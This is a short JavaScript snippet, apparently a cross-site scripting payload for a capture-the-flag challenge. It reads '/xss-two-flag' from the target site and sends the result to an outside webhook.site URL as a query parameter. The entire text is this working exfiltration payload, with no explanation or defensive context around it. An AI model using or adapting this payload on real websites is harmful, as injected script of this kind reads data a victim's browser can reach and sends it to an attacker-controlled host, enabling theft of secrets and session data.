fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
    fetch('https://webhook.site/abc-123?flag=' + encodeURIComponent(flag));
  });